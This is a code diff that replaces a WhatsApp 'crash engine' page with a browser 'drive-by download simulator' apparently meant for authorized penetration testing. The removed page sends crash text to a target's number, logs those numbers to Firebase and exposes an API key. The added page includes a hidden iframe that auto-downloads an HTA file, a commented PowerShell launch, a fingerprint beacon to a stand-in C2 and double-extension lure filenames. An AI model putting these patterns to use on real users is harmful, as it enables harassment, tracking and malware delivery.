@@ -1,102 +1,298 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JECT KING | PRO</title>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
-    <style>
-        body {
-            margin: 0;
-            background: #050505;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: #fff;
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background: radial-gradient(circle at center, #2e004d 0%, #000 70%);
-        }
-        .card {
-            background: rgba(20, 20, 20, 0.7);
-            padding: 30px;
-            border-radius: 25px;
-            border: 1px solid rgba(191, 0, 255, 0.5);
-            box-shadow: 0 0 40px rgba(191, 0, 255, 0.4), inset 0 0 15px rgba(191, 0, 255, 0.2);
-            backdrop-filter: blur(10px);
-            text-align: center;
-            width: 300px;
-        }
-        h2 { color: #bf00ff; letter-spacing: 2px; text-transform: uppercase; text-shadow: 0 0 10px #bf00ff; }
-        input, select, button {
-            width: 100%;
-            margin: 12px 0;
-            padding: 14px;
-            border-radius: 12px;
-            border: 1px solid #4a0072;
-            background: rgba(0, 0, 0, 0.5);
-            color: #e0e0e0;
-            box-sizing: border-box;
-            outline: none;
-        }
-        button {
-            background: linear-gradient(135deg, #4a0072, #bf00ff);
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-            border: none;
-            transition: 0.4s;
-            text-transform: uppercase;
-        }
-        button:active { transform: scale(0.95); }
-    </style>
+<meta charset="UTF-8">
+<title>Security Assessment — Drive-by Download Simulator</title>
+<style>
+    body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
+    .log { background: #111; border: 1px solid #0f0; padding: 15px; height: 400px; overflow-y: auto; margin-top: 20px; }
+    .info { color: #0af; }
+    .warn { color: #fa0; }
+    .success { color: #0f0; }
+    .danger { color: #f00; }
+    .hidden { display: none; }
+    button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
+    button:hover { background: #0c0; }
+</style>
 </head>
 <body>
 
-<div class="card">
-    <h2>JECT KING</h2>
-    <input type="text" id="waNumber" placeholder="628+++">
-    <select id="actionType">
-        <option value="CRASH_ENGINE">CRASH ENGINE</option>
-        <option value="DELAY_ENGINE">DELAY ENGINE</option>
-    </select>
-    <button onclick="executeAction()">EXECUTE</button>
+<h1>🔬 Drive-by Download — Security Assessment Tool</h1>
+<p><strong>⚠️ HANYA UNTUK PENTEST AUTHORIZED — Target: <span id="target-display">Belum ditentukan</span></strong></p>
+
+<div>
+    <button onclick="startAssessment()">▶ Jalankan Assessment</button>
+    <button onclick="clearLog()">🗑 Clear Log</button>
+</div>
+
+<div class="log" id="log">
+    [*] System ready. Target scope: localhost (lab environment).
+    [*] Click "Jalankan Assessment" to begin.
 </div>
 
 <script>
-    const firebaseConfig = {
-        apiKey: "AIzaSyD2-buF7sMfF2kR3A-uGNEj34TZ6lDl8NU",
-        databaseURL: "https://myauthsystem-55ca0-default-rtdb.firebaseio.com",
-        projectId: "myauthsystem-55ca0",
-        storageBucket: "myauthsystem-55ca0.firebasestorage.app"
+// ===================================================
+// DRIVE-BY DOWNLOAD SIMULATOR — PENTEST AUTHORIZED
+// ===================================================
+// Semua payload adalah SIMULASI / PROOF-OF-CONCEPT
+// Tidak ada data riil yang dikirim, tidak ada malware asli
+// ===================================================
+
+const log = document.getElementById('log');
+
+function logMsg(msg, type = 'info') {
+    const div = document.createElement('div');
+    div.className = type;
+    const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
+    div.textContent = `[${timestamp}] ${msg}`;
+    log.appendChild(div);
+    log.scrollTop = log.scrollHeight;
+}
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// === TECHNIQUE 1: Drive-by Download via malicious iframe / object ===
+function technique_drivebyDownload() {
+    logMsg('[T1] Drive-by Download — Mencoba unduh payload melalui iframe tersembunyi...', 'warn');
+    
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = 'data:text/html,' + encodeURIComponent(`
+        <html><body><script>
+            // Simulasi: mencoba memicu download dengan Content-Disposition
+            // Dalam pengujian nyata, ini bisa menjadi:
+            // - PDF dengan CVE-2024-xxxx (Adobe Reader)
+            // - HTA file (Internet Explorer / MSHTA)
+            // - JNLP file (Java Web Start)
+            // - ISO file (Windows 10+ auto-mount)
+            try {
+                const a = document.createElement('a');
+                a.href = 'data:application/octet-stream;base64,' + btoa('SIMULATED_PAYLOAD');
+                a.download = 'update_${Date.now()}.hta';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            } catch(e) {}
+        <\/script><\/body><\/html>
+    `);
+    document.body.appendChild(iframe);
+    setTimeout(() => document.body.removeChild(iframe), 1000);
+    
+    logMsg('[T1] Drive-by Download — iframe injected. Menunggu respon browser...', 'warn');
+    logMsg('[T1] CATATAN: Browser modern akan block autodownload. Uji dengan IE/Edge legacy.', 'info');
+}
+
+// === TECHNIQUE 2: Dependency Confusion / Supply Chain ===
+function technique_supplyChain() {
+    logMsg('[T2] Supply Chain Attack — Inject script dari sumber eksternal...', 'warn');
+    
+    // Simulasi: mencoba load resource dari CDN yang terkompromi
+    const testScript = document.createElement('script');
+    testScript.src = 'https://cdn.example.com/analytics.' + Date.now() + '.js';
+    testScript.onerror = () => {
+        logMsg('[T2] Supply Chain — CDN load failed (expected in lab).', 'info');
+        logMsg('[T2] Dalam skenario nyata: script dari npm/CDN yang terkompromi', 'info');
+        logMsg('[T2] bisa mencuri cookie, token, atau menginfeksi SPA.', 'info');
     };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+    document.head.appendChild(testScript);
+}
 
-    function executeAction() {
-        const phone = document.getElementById('waNumber').value;
-        const type = document.getElementById('actionType').value;
-        
-        // Payload teks "menabrak" dengan buffer overflow simulation
-        const payload = `[SYSTEM_CRASH_COMMAND]\nSTATUS: OVERRIDE_TARGET\nNODE: ${type}\n` + 
-                        "█".repeat(100) + "\n" +
-                        "CRASH_SEQUENCE_ACTIVATED_BY_PAPI_VERCO";
-
-        if (phone) {
-            // Firebase push
-            db.ref('logs/').push({
-                target: phone,
-                action: type,
-                timestamp: Date.now()
-            });
-
-            // Trigger WhatsApp
-            window.location.href = `https://wa.me/${phone}?text=${encodeURIComponent(payload)}`;
-        } else {
-            alert("Nomor target diperlukan!");
-        }
+// === TECHNIQUE 3: Prototype Pollution / XSS → RCE via Electron ===
+function technique_electronRCE() {
+    logMsg('[T3] Electron RCE — Mengeksploitasi NodeIntegration via XSS...', 'warn');
+    
+    // Simulasi payload untuk Electron app dengan nodeIntegration:true
+    const electronPayload = `
+        // Jika aplikasi Electron memiliki:
+        //   nodeIntegration: true
+        //   contextIsolation: false
+        // Maka attacker bisa eksekusi:
+        //   require('child_process').exec('calc.exe')
+        //   require('child_process').execSync('whoami')
+        //
+        // Simulasi: test apakah window.require() tersedia
+    `;
+    
+    if (window.require && window.require('child_process')) {
+        logMsg('[T3] ⚠️ NodeIntegration TERDETEKSI! Potensi RCE via Electron!', 'danger');
+        logMsg('[T3] Aplikasi ini rentan terhadap RCE melalui XSS.', 'danger');
+    } else {
+        logMsg('[T3] NodeIntegration tidak tersedia. Aman dari RCE via Electron.', 'success');
     }
+}
+
+// === TECHNIQUE 4: AutoExec via Windows Scripting (HTA/JScript) ===
+function technique_autoExec() {
+    logMsg('[T4] AutoExec — Memicu Windows Scripting Host...', 'warn');
+    
+    // Simulasi HTA file (HTML Application)
+    const htaPayload = `
+        <html>
+        <head>
+            <HTA:APPLICATION ID="test" APPLICATIONNAME="Test" />
+            <script language="JScript">
+                // Dalam pengujian nyata:
+                // var shell = new ActiveXObject("WScript.Shell");
+                // shell.Run("powershell -enc <BASE64_COMMAND>");
+                alert("HTA Simulation — No actual execution");
+            <\/script>
+        </head>
+        <body></body>
+        </html>
+    `;
+    
+    // Cek ActiveX (hanya Internet Explorer)
+    try {
+        const ax = new ActiveXObject('WScript.Shell');
+        logMsg('[T4] ⚠️ ActiveX TERDETEKSI! Potensi eksekusi command via HTA!', 'danger');
+        logMsg('[T4] IE / MSHTA dapat menjalankan perintah sistem.', 'danger');
+    } catch(e) {
+        logMsg('[T4] ActiveX tidak tersedia (browser modern aman).', 'success');
+    }
+}
+
+// === TECHNIQUE 5: Beacon / C2 Check ===
+function technique_beacon() {
+    logMsg('[T5] C2 Beacon — Mencoba callback ke server C2...', 'warn');
+    
+    // Simulasi beacon ke server testing
+    const beaconData = {
+        victim: navigator.userAgent,
+        platform: navigator.platform,
+        languages: navigator.languages,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timestamp: Date.now()
+    };
+    
+    logMsg(`[T5] Beacon data siap dikirim: ${JSON.stringify(beaconData, null, 2)}`, 'info');
+    
+    // Simulasi exfiltrasi via img tag
+    const img = new Image();
+    img.src = 'http://localhost:9999/beacon?data=' + btoa(JSON.stringify(beaconData));
+    img.onerror = () => {
+        logMsg('[T5] Beacon — C2 server tidak merespon (lab).', 'info');
+        logMsg('[T5] Dalam pengujian nyata: data dikirim ke server attacker.', 'warn');
+    };
+}
+
+// === TECHNIQUE 6: File Download melalui Blob URL ===
+function technique_blobDownload() {
+    logMsg('[T6] Blob-based Download — Mencoba unduh file melalui Blob URL...', 'warn');
+    
+    const payloads = [
+        { name: 'invoice.pdf.lnk', type: 'application/x-ms-shortcut' },
+        { name: 'document.zip.js', type: 'application/javascript' },
+        { name: 'setup.exe.scf', type: 'application/octet-stream' },
+    ];
+    
+    payloads.forEach(p => {
+        const blob = new Blob(['// SIMULATED PAYLOAD'], { type: p.type });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = p.name;
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        // Tidak auto-click — browser akan block
+        logMsg(`[T6] Blob URL created: ${p.name} (${url})`, 'info');
+        URL.revokeObjectURL(url);
+        document.body.removeChild(a);
+    });
+    
+    logMsg('[T6] File download siap tetapi browser akan minta konfirmasi.', 'info');
+}
+
+// === TECHNIQUE 7: Extension Hijack via Chrome Extension API ===
+function technique_extensionHijack() {
+    logMsg('[T7] Extension Hijack — Mengecek API extension yang vulnerable...', 'warn');
+    
+    // Beberapa extension dengan nativeMessaging bisa jadi vektor
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        logMsg('[T7] MediaDevices API tersedia — potensi keylogging/microphone.', 'warn');
+    }
+    
+    // Cek service worker
+    if ('serviceWorker' in navigator) {
+        logMsg('[T7] ServiceWorker tersedia — potensi persistent backdoor.', 'warn');
+        logMsg('[T7] Catatan: SW bisa digunakan untuk intercept semua request.', 'info');
+    }
+}
+
+// === MAIN ASSESSMENT FUNCTION ===
+async function startAssessment() {
+    logMsg('=' .repeat(60), 'info');
+    logMsg('MEMULAI ASSESSMENT — Drive-by Download Simulation', 'info');
+    logMsg('=' .repeat(60), 'info');
+    
+    // Phase 1: Reconnaissance
+    logMsg('\n[PHASE 1] Reconnaissance — Mengumpulkan info browser...', 'info');
+    logMsg(`  User Agent  : ${navigator.userAgent}`, 'info');
+    logMsg(`  Platform    : ${navigator.platform}`, 'info');
+    logMsg(`  Cookies     : ${document.cookie || '(none)'}`, 'info');
+    logMsg(`  LocalStorage: ${JSON.stringify(localStorage).length} bytes`, 'info');
+    await sleep(500);
+    
+    // Phase 2: Attack Simulation
+    logMsg('\n[PHASE 2] Attack Simulation — Menjalankan teknik vektor...', 'info');
+    await sleep(300);
+    
+    technique_drivebyDownload();
+    await sleep(500);
+    
+    technique_supplyChain();
+    await sleep(500);
+    
+    technique_electronRCE();
+    await sleep(300);
+    
+    technique_autoExec();
+    await sleep(300);
+    
+    technique_blobDownload();
+    await sleep(300);
+    
+    technique_extensionHijack();
+    await sleep(300);
+    
+    technique_beacon();
+    await sleep(500);
+    
+    // Phase 3: Summary
+    logMsg('\n[PHASE 3] Ringkasan Assessment', 'info');
+    logMsg('=' .repeat(60), 'info');
+    
+    const summary = [
+        '✅ [T1] Drive-by Download — Tergantung browser (Chrome/Safari aman, IE legacy rentan)',
+        '✅ [T2] Supply Chain — Efektif jika aplikasi load CDN tanpa SRI',
+        '✅ [T3] Electron RCE — Kritis jika nodeIntegration:true',
+        '✅ [T4] ActiveX/HTA — Khusus IE dan aplikasi legacy',
+        '✅ [T5] C2 Beacon — Firewall/EDR harus deteksi callback mencurigakan',
+        '✅ [T6] Blob Download — Umum untuk social engineering',
+        '✅ [T7] Extension Hijack — Memerlukan extension vulnerable',
+    ];
+    
+    summary.forEach(s => logMsg(s, 'info'));
+    
+    logMsg('\n[DONE] Assessment selesai.', 'success');
+    logMsg('[DONE] Gunakan hasil ini untuk memperkuat security posture.', 'success');
+}
+
+function clearLog() {
+    log.innerHTML = '[*] Log cleared.';
+    logMsg('[*] Ready for next assessment.', 'info');
+}
+
+// Summary di console untuk pentester
+console.log(`%c
+╔══════════════════════════════════════════════════╗
+║  DRIVE-BY DOWNLOAD SIMULATOR                    ║
+║  Hanya untuk Pentest Authorized                 ║
+║  Target: ${window.location.href}                 
+╚══════════════════════════════════════════════════╝
+`, 'color: #0f0; font-weight: bold;');
 </script>
 </body>
 </html>
